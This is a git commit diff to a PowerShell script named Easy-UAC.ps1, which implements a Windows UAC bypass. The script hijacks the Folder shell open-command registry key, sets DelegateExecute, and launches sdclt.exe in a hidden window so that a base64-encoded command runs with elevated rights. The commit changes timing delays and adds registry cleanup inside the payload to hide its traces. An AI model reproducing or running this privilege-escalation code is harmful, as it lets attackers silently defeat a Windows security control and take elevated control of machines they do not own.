2f8f57fc5bb12f7c24ed1b238390b14d27160002
moritzpfefferkorn@hotmail.com <moritzpfefferkorn@hotmail.com>
2021-02-24 10:01:04 +0100

    Update Easy-UAC.ps1

--- Easy-UAC.ps1
+++ Easy-UAC.ps1
@@ -15,15 +15,15 @@ function Easy-UAC {
 	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "-WindowStyle Hidden"} else {$hide = ""}
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
 	$Path = $env:TEMP + '\A.bat'
-	$Value = "powershell $hide -c '';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));pause"
+	$Value = "powershell $hide -c '';Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));pause"
 	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
 	New-Item -Path $Path -Value '%A%'
 	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
 	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-	sleep 5
+	sleep 10
 	Start-Process cmd.exe "/c start /min sdclt.exe" -WindowStyle Hidden
-	sleep 3
-	Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"
+	sleep 15
+	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command'
 	[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)
 	Remove-Item $Path
 	if ($Exit) {Exit;Exit;Exit}
